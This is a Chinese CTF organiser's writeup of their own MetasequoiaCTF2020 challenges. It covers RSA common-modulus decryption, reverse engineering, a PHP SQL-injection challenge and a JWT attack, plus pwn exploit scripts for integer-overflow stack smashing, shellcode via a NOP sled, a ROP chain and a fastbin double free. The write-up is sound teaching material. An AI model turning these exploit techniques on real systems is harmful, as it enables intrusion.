---
title: 牛刀小试：MetasequoiaCTF2020 部分题解
date: 2020-02-15 16:52:16
tags:
  - RSA
  - 古典密码与编码
  - 整数溢出
  - 栈漏洞
  - 堆漏洞
  - JWT
categories:
  - 比赛记录
featuredImage: https://cdn.jsdelivr.net/gh/SignorMercurio/blog-cdn/MetasequoiaCTF2020/0.png
---

第一次出题，经验不足，感谢参赛选手海涵。

<!--more-->

这次给队内新人赛出题，题目设置得比较简单，共有：

- Web \* 5
- Pwn \* 5
- Misc \* 4
- Crypto \* 3
- Reverse \* 3

我负责出 Pwn 和 Reverse、Crypto 的签到题、以及两题 Web。这里就写下我负责出的题的 wp。

## Crypto

### Ridicule

首先是没有绕任何弯的 RSA 共模攻击。题目描述说同一条消息发送了两次，可以很容易想到这个方法。原理详见 [CTF Wiki](https://ctf-wiki.github.io/ctf-wiki/crypto/asymmetric/rsa/rsa_module_attack-zh/#_6)。

这里给出加密和解密的脚本：

```python
from Crypto.Util import number
from gmpy2 import *

# enc
n_length = 2048
p = number.getPrime(n_length)
q = number.getPrime(n_length)
n = p*q
print(n)
phi = (p-1)*(q-1)

e1 = 65537
e2 = 395327
d1 = invert(e1,phi)
d2 = invert(e2,phi)

#flag = b'flag{rS4_c0mOon_MOdu1u5_a7k}'
flag = b'7=28LC$c04_>~@?0|~5F`Fd02f<N'
flag = number.bytes_to_long(flag)
c1 = powmod(flag,e1,n)
c2 = powmod(flag,e2,n)
print(c1)
print(c2)

# dec
def exgcd(a,b):
    if b==0:
        return 1, 0, a
    x2, y2, r = exgcd(b, a%b)
    x1 = y2
    y1 = x2-(a//b)*y2
    return x1, y1, r

s1,s2,t = exgcd(e1,e2)
m = powmod(c1,s1,n) * powmod(c2,s2,n) % n
print(number.long_to_bytes(m))
```

在解密后得到了：

```
7=28LC$c04_>~@?0|~5F`Fd02f<N
```

观察密文的字符集，不难发现是 ROT47 加密，再 ROT47 一次即解密得到了 flag。

## Reverse

我并不是很会出逆向，但是队伍里有同学需要做，于是这些题目基本都是有原题的。

### CMCS

Reverse 类签到题，虽然可以静态分析出答案，还是推荐动态调试。逆向可以发现关键函数 `sub_8048708` 和 `sub_8048658`，分析前者可知 `eax` 存储 `sub_8048658` 返回的 flag 值，因此在后者下断点调试，打印 `eax` 值即得到 flag。

```
b *0x8048658
r
fin
x/16sw $eax
```

### Babysmali

题目给了 `smali.jar` 以及 `src.smali`，我们先将后者汇编成 `dex` 文件。

```shell
$ java -jar smali.jar assemble src.smali -o src.dex
```

然后使用 jadx 反编译 `dex` 文件：

```java
package com.example.hellosmali.hellosmali;

public class Digest {
    public static boolean check(String input) {
        String str = "+/abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
        if (input == null || input.length() == 0) {
            return false;
        }
        int i;
        char[] charinput = input.toCharArray();
        StringBuilder v2 = new StringBuilder();
        for (char toBinaryString : charinput) {
            String intinput = Integer.toBinaryString(toBinaryString);
            while (intinput.length() <8) {
                intinput = "0" + intinput;
            }
            v2.append(intinput);
        }
        while (v2.length() % 6 != 0) {
            v2.append("0");
        }
        String v1 = String.valueOf(v2);
        char[] v4 = new char[(v1.length() / 6)];
        for (i = 0; i < v4.length; i++) {
            int v6 = Integer.parseInt(v1.substring(0, 6), 2);
            v1 = v1.substring(6);
            v4[i] = str.charAt(v6);
        }
        StringBuilder v3 = new StringBuilder(String.valueOf(v4));
        if (input.length() % 3 == 1) {
            v3.append("!?");
        } else if (input.length() % 3 == 2) {
            v3.append("!");
        }
        if (String.valueOf(v3).equals("xsZDluYYreJDyrpDpucZCo!?")) {
            return true;
        }
        return false;
    }
}
```

从字符集可以看出和 Base64 编码有关，实际上只是它的一个变种。既可以用 python 解，也可以用 java 解，python 版：

```python
import string

base64_charset = '+/abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'

def decode(base64_str):
    """
    解码 base64 字符串
    :param base64_str:base64 字符串
    :return: 解码后的 bytearray；若入参不是合法 base64 字符串，返回空 bytearray
    """
    # 对每一个 base64 字符取下标索引，并转换为 6 为二进制字符串
    base64_bytes = ['{:0>6}'.format(str(bin(base64_charset.index(s))).replace('0b', '')) for s in base64_str if
                    s != '=']
    resp = bytearray()
    nums = len(base64_bytes) // 4
    remain = len(base64_bytes) % 4
    integral_part = base64_bytes[0:4 * nums]

    while integral_part:
        # 取 4 个 6 位 base64 字符，作为 3 个字节
        tmp_unit = ''.join(integral_part[0:4])
        tmp_unit = [int(tmp_unit[x: x + 8], 2) for x in [0, 8, 16]]
        for i in tmp_unit:
            resp.append(i)
        integral_part = integral_part[4:]

    if remain:
        remain_part = ''.join(base64_bytes[nums * 4:])
        tmp_unit = [int(remain_part[i * 8:(i + 1) * 8], 2) for i in range(remain - 1)]
        for i in tmp_unit:
            resp.append(i)

    return resp

if __name__=="__main__":
    print decode('A0NDlKJLv0hTA1lDAuZRgo==')
```

java 版：

```java
public class XMan {
    public static void main(String[] args) {
        String v6 = "+/abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
        String s = "xsZDluYYreJDyrpDpucZCo";
        StringBuilder sb = new StringBuilder();
        for (int i = 0; i < s.length(); i++) {
            int tmp = v6.indexOf(s.charAt(i));
            String ss = Integer.toBinaryString(tmp);
            if (ss.length() == 5) {
                ss = "0" + ss;
            } else if (ss.length() == 4) {
                ss = "00" + ss;
            } else if (ss.length() == 3) {
                ss = "000" + ss;
            } else if (ss.length() == 2) {
                ss = "0000" + ss;
            } else if (ss.length() == 1) {
                ss = "00000" + ss;
            } else if (ss.length() == 0) {
                ss = "000000" + ss;
            }
            sb.append(ss);
        }
        String x = sb.toString() +"0000";
        StringBuilder stringBuilder = new StringBuilder();
        for (int i = 0; i < x.length(); i += 8) {
            String tmp = x.substring(i, i + 8);
            byte b = (byte) Integer.parseInt(tmp, 2);
            stringBuilder.append((char) b);
        }
        System.out.println(stringBuilder.toString());


    }
}
```

### Prison

这是一道纯迷宫题，只是工作量有点大。[参考 WP](https://singularityctf.blogspot.com/2014/03/volgactf-quals-2014-writeup-reverse-100.html)。

## Pwn

所有题目均为 64 位程序，libc 版本 2.23。

### Blacksmith

Pwn 类签到题。本题的输出让这题看上去像堆题，但实际上只有第一个锻造剑的功能是有实际作用的。可以看到在给剑命名时，首先要输入名字长度，如果长度超过 `0x40` 则失败。但是注意到名字长度这个变量是无符号的，因此可以整数溢出：输入 `-1`，则可输入 `0xffffffffffffffff` 字符，绕过了这个判断。

随后就可以栈溢出了，程序中存在后门函数，直接 `ret2text`。

```python
sla('> ','1')
sla('name?\n','-1')
payload = flat('a'*0x48,0x4007d6)
sla('is?\n',payload)
```

### Snow Mountain

这题关闭了 NX 保护，说明需要布置 shellcode，难点在于找到 shellcode 位置。程序首先给出一个栈上的随机地址，并且栈上存在一个 `0x1000` 的字符数组。根据题目提示 "滑雪"、"雪橇" 等，容易想到利用 nop sled 滑到 shellcode 的位置来增加容错率。想到 nop sled 的话这题就做完了。

```python
ru('position: 0x')
cur = int(ru('\n'),16)
leak('cur',cur)
payload = asm(shellcraft.sh())
payload = payload.rjust(0x1000-1,'\x90')
sla('> ',payload)
sla('> ',hex(cur))
```

### Summoner

本次比赛唯二的堆题，但是极其简单。邪恶召唤师召唤了一只 5 级生物，但是你只能召唤四级生物，你的目的就是修改生物的等级为 5 级。

题目提供了几种命令：

- 展示召唤物信息
- 召唤一只生物，并给它起名字
- 设置生物的等级，但必须小于 5
- 攻击敌方召唤物
- 释放召唤物

我们通过逆向可以得知，召唤物的结构体长这样：

```c
struct creature {
    char *name;
    int level;
};
```

随后可以发现两处漏洞：

- 召唤时，输入的 `name` 使用 `strdup` 函数（隐式调用了 `malloc`），但并没有检查长度，因此可以溢出到下一个 8 字节处。
- 在释放召唤物时，只会调用 `free(c->name)`，然后将结构体指针置空，但并不会释放结构体指针本身。

因此我们尝试先召唤一个名为 `aaaaaaaa\x05` 的生物，此时堆结构如下：

```
pwndbg> heapls
           ADDR             SIZE            STATUS
sbrk_base  0x56476bb24000
chunk      0x56476bb24000   0x1010          (inuse)
chunk      0x56476bb25010   0x20            (inuse)
chunk      0x56476bb25030   0x20            (inuse)
chunk      0x56476bb25050   0x20fb0         (top)
sbrk_end   0x56476bb46000
pwndbg> x/8gx 0x56476bb25010
0x56476bb25010:    0x0000000000000000    0x0000000000000021
0x56476bb25020:    0x000056476bb25040    0x0000000000000000
0x56476bb25030:    0x0000000000000000    0x0000000000000021
0x56476bb25040:    0x6161616161616161    0x0000000000000005
```

可以看到有 2 块 0x20 的 chunk，第一块是结构体指针，存放着 `name` 地址和 `level` 数值；第二块就是 `name` 了，存放着我们输入的 `name`，注意这时第二个 8 字节已经是 5 了。随后我们释放召唤物：

```
pwndbg> x/8gx 0x5621c569e010
0x5621c569e010:    0x0000000000000000    0x0000000000000021
0x5621c569e020:    0x00005621c569e040    0x0000000000000000
0x5621c569e030:    0x0000000000000000    0x0000000000000021
0x5621c569e040:    0x0000000000000000    0x0000000000000005
```

这时 `name` 被 `free` 了但指针还在，我们刚刚写的 `\x05` 也还在。这时再召唤就能得到 `0x5621c569e030` 处的一块 chunk 作为结构体指针，而新的 `name` 跑到了 `0x55feced35050`：

```
pwndbg> x/12gx 0x55feced35010
0x55feced35010:    0x0000000000000000    0x0000000000000021
0x55feced35020:    0x000055feced35040    0x0000000000000000
0x55feced35030:    0x0000000000000000    0x0000000000000021
0x55feced35040:    0x000055feced35060    0x0000000000000005
0x55feced35050:    0x0000000000000000    0x0000000000000021
0x55feced35060:    0x0000000000000061    0x0000000000000000
```

于是此时，结构体指针里的 `level` 就变成了 5。

```python
sla('> ','summon aaaaaaaa'+'\x05')
sla('> ','release')
sla('> ','summon a')
sla('> ','strike')
```

### Demon Dragon

题目本身不难，略微有些工作量。

首先是逆向程序，一开始会调用 6 个函数，这 6 个函数来自题目同时给出的 `libmagic.so`，目的是为了让这 6 个函数被动态链接进来，可以直接忽略。随后，Demon Dragon 会使用 5 种元素攻击你，元素的顺序是随机的。接下来需要输入使用的技能，这里存在简单的 `gets` 栈溢出。但是并不清楚溢出之后要干什么。

然后我们逆向 `libmagic.so`，这个文件保留了符号表，因此可以看到刚才的 6 个函数，分别是 5 种元素护盾和一个 `check` 函数。观察后可以发现每种元素护盾都可以克制另一种元素（克制关系在题目描述里），当 5 种攻击都被克制后就可以通过 `check` 来拿到 flag。可以看到 `check` 里存在 `system("cat flag");`，如果这个函数不是动态链接的，选手可以直接栈溢出跳到这里。此外，5 种护盾如果没有符号表则逆向难度较大，因此我把它们和 `check` 都编译成了动态链接库。

最后来看护盾如何调用：所有护盾都只需要函数参数等于特定值即可成功调用，区别仅仅是特定值与参数个数不同。那么如何控制参数呢？这是 64 位程序，我们需要控制前三个参数寄存器 `rdi,rsi,rdx`。前两者在偏移过的 `__lib_csu_init` 中可以找到，比较通用：

```
pop rdi; ret
pop rsi; pop r15; ret
```

而 `rdx` 不太好控制，于是我在程序中直接硬编码了一个 gadget：

```
pop rdi; pop rsi; pop rdx; ret
```

这样就可以构造 rop 链了，按元素克制关系调用 5 种护盾，最后返回到 `check` 函数 getflag。不要忘了 `check` 函数也需要参数，这个参数可以参考第一次调用 `check` 时候的参数，位于 `0x6020b0`。

```python
ru('with')
elem = [ru(', ') for i in range(4)]
elem.append(ru('!\n'))

pop_rdi = 0x400e43 # 1
pop_rsi = 0x400e41 # 2
pop3 = 0x400c3a # 1,2,3

strategy = {
    'gold': flat(pop_rdi,0xdeadbabe,pop_rsi,0xdeadfa11,0,elf.plt['fire_shield']),
    'wood': flat(pop_rdi,0xdeadbeef,elf.plt['gold_shield']),
    'water': flat(pop_rdi,0xfee1dead,elf.plt['earth_shield']),
    'fire': flat(pop3,0xbaaaaaad,0x8badf00d,0xd15ea5e,elf.plt['water_shield']),
    'earth': flat(pop_rdi,0xcafebabe,pop_rsi,0xdeadbaad,0,elf.plt['wood_shield'])
}

payload = 'a'*0x48
for attack in elem:
    payload += strategy[attack]

pos = 0x6020b0
payload += flat(pop_rdi,pos,elf.plt['check'])
sla('Skill> ',payload)
```

注意链接时 `libmagic.so` 的目录，我放在和源程序同一目录下因此使用选项 `-L.`。同时 `/usr/lib/` 下也需要有 `libmagic.so`。

此外，感谢 TaQini 师傅提供的非预期解：直接 ret2libc。

> 这么一说我才想起来，我原来确实是打算出 ret2libc 的，不知道怎么就改成了这个样子。

### Samsara

又一道堆题，应该是最难的 Pwn 题。

逆向可以知道每次抓人都执行 `malloc(8)`，我们不能控制分配的大小。那么在释放的时候，chunk 必定进入 fastbin。操作 3 就是编辑 chunk 的内容，不存在溢出。但是这题有两个奇怪的操作：输入 4 会打印出栈上变量 `lair` 的位置，输入 5 会改变 `lair` 的值。最后，退出程序时，检查栈上变量 `target` 是否等于 `0xdeadbeef`，如果等于就能 getflag，但是整个程序中不存在对 `target` 的任何读写操作。

漏洞点在于 `free` 之后没有置指针为 NULL，考虑 `double free`。首先分配三个 chunk，按 `chunk0->chunk1->chunk0` 的顺序释放，第二次释放 `chunk0` 时它不在对应 fastbin 的头部，因此不会被检测到。再申请两次分别得到 `chunk3` 和 `chunk4`，按 first-fit 原则前者即 `chunk0`，后者即 `chunk1`，但此时 `chunk0` 依然会留在 fastbin 中。

接下来，我们在 `target` 附近伪造 chunk。我们逆向发现 `lair` 在 `target` 上方 8B 处，因此先输入 4，设置 `lair=0x20` 以伪造 `chunk_size`。然后输入 5 得到 `&lair`，那么 `&lair-8` 处就是伪造的 chunk 的 chunk 指针。伪造好以后，我们向 `chunk3` 即 `chunk0` 的 `fd` 写入 `&lair-8`。此时，fastbin 内就变成了 `chunk0->fake_chunk`，申请一次得到 `chunk0`，第二次得到 `fake_chunk`。

此时向 `fake_chunk` 写数据，等价于向 `(&lair-8) + 0x10` 也就是 `target` 写数据，写入 `0xdeadbeef` 并退出程序即可。

```python
def add():
    sla('> ','1')

def delete(index):
    sla('> ','2')
    sla(':\n',str(index))

def edit(index,content):
    sla('> ','3')
    sla(':\n',str(index))
    sla(':\n',content)

def show():
    sla('> ','4')
    ru('0x')
    return int(ru('\n'),16)

def move(dest):
    sla('> ','5')
    sla('?\n', str(dest))

add() # 0
add() # 1
add() # 2
delete(0)
delete(1)
delete(0)

add() # 3 <-> 0
add() # 4
move(0x20)
fake = show()-8
edit(3,fake)
add() # 5
add() # 6
edit(6,0xdeadbeef)
sla('> ','6')
```

## Web

### UTF-8

题目给了一个 `rfc3629` 的链接，也就是 UTF-8 编码的 RFC 文件。

首先访问发现是空页面，扫一下可以发现 `robots.txt`，指向一个奇怪的文件：

```
length q chdir lc and print chr ord q each le and print chr ord q lc eval and print chr ord q lt eval and print chr ord q sin s and print chr ord q xor x and print chr ord qw q not q and print chr oct oct ord q eq ge and print chr ord q msgctl m and print chr ord q local and print chr ord q dump and and print chr ord q or no and print chr ord q oct no and print chr ord q ge log
```

提示说 `chmod +x secretscript`，说明这个文件是可以运行的，因此猜想这是脚本文件，查阅资料可知这是 `ppencoding`，放入在线 Perl 运行工具运行一下，得到：

```
action=source
```

把这个当作 GET 参数，访问得到源码：

```php
<?php

$conn->query("set names utf8");

$sql = "create table `user` (
         `id` int(10) unsigned NOT NULL PRIMARY KEY  AUTO_INCREMENT ,
         `username` varchar(30) NOT NULL,
         `passwd` varchar(32) NOT NULL,
         `role` varchar(30) NOT NULL
       )ENGINE=MyISAM AUTO_INCREMENT=1 DEFAULT CHARSET=latin1 COLLATE=latin1_general_ci ";
if ($conn->query($sql)) {
  $sql  = "insert into `user`(`username`,`passwd`,`role`) values ('admin','".md5(randStr())."','admin')";
  $conn->query($sql);
}

function filter($str) {
     $filter = "/ |\*|,|;|union|is|like|regexp|and|or|for|file|#|--|\||&|`|".urldecode('%a0')."|".urldecode("%0a")."|".urldecode("%0b")."|".urldecode('%0c')."|".urldecode('%0d')."|".urldecode('%09')."/i";
     if(preg_match($filter,$str)) {
         die("?");
     }
     return $str;
}

function login($username,$passwd) {
    global $conn;

    $username = trim(strtolower($username));
    $passwd = trim(strtolower($passwd));
    if ($username =='admin') {
        die("No, I know you are not admin.");
    }

    $sql = "select * from `user` where username='".$conn->escape_string($username)."' and passwd='".$conn->escape_string($passwd)."'";
    $res = $conn->query($sql);
    if ($res->num_rows > 0) {
        if($res->fetch_assoc()['role'] ==='admin') {
            exit($flag);
        }
    } else {
       echo "Username / Passwd Error!";
    }
}

$username = isset($_POST['username'])?filter($_POST['username']):"";
$passwd = isset($_POST['passwd'])?filter($_POST['passwd']):"";
$action = isset($_GET['action'])?filter($_GET['action']):"";

switch($action) {
   case "source": source(); break;
   case "login" : login($username,$passwd);break;
   case "show" : show($username);break;
}

echo 'R U sure U R familiar with UTF-8?';
```

过滤了很多字符，但是并不是没有报错注入的可能，利用 `solve.py` 可以注入出管理员密码。

但是直接用 `admin` 和密码登录是不行的，因为有如下判断：

```php
if ($username =='admin') {
    die("No, I know you are not admin.");
}
```

这里的绕过技巧来自 [这篇文章](https://www.leavesongs.com/PENETRATION/mysql-charset-trick.html)，细节还是比较多的，也是这题名称的由来。

### jwt

JSON Web Token 算法篡改攻击，看了 [这篇文章](https://www.anquanke.com/post/id/145540#h3-8) 后改的题。最后访问 `admin` 的 `note` 的时候，会得到一个 url 路径，访问该路径即为 flag。这样做是为了支持动态 flag，因为 sqlite 对读文件的支持不是特别好。
